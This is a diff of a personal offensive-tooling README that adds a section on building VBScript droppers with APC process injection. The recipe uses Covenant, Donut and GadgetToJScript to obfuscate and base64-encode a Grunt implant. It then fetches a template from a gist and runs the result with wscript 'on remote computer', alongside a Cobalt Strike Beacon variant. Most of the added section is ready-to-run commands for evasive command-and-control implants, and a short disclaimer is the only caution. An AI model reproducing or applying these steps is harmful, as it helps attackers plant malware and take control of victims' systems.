@@ -4,13 +4,13 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 
 **_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**
 
-* Generate VBScript using APC process injection
+* [Generate VBScript dropper (APC process injection)](generate-vbscript-dropper-(apc-process-injection))
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
 * [File Transfer](#file-transfer)
 
-## Generate .NET dropper (APC process injection)
-_Requirements:_Make sure to ownload [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git).
+## Generate VBScript dropper (APC process injection)
+Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git).
 ### Cobalt Strike Beacon
 For cobalt strike, this aggressor script called [**ShellCode Generator**](https://github.com/RCStep/CSSG) is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method. 
 
@@ -23,6 +23,31 @@ GadgetToJScript.exe -b -w vbs -o beacon -c .\real.cs
 ```
 
 3. Execute with `wscript.exe beacon.cs`
+
+### Covenant Grunt
+For covenant, since its already has its built in .NET generator. You can use donut to further obfuscate the assembly/
+
+1. Generate **binary** from Covenant
+2. Obfuscate and convert to byte array with **Donut**. It will then generate into .bin file. 
+```powershell
+donut.exe -f .\Grunt.exe
+```
+3. Convert .bin file to base64 and save to clipboard
+```powershell
+# save filepath to a variable
+$filename='<file-path-to>\payload.bin'
+# Convert file to base64 and save to clipboard
+[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename) | Clip
+```
+4. Download [this](https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt) script, save as payload.cs (or anythin bcs no one cares) and replace the `b64` variable with our current clipboard
+5. Convert payload.cs to vbs with **GadgetToJScript**
+```powershell
+.\GadgetToJScript.exe -b -w vbs -o realtest -c .\real.cs
+```
+6. Execute on remote computer 
+```powershell
+wscript.exe .\realtest.vbs
+```
 
 ## File Transfer
 
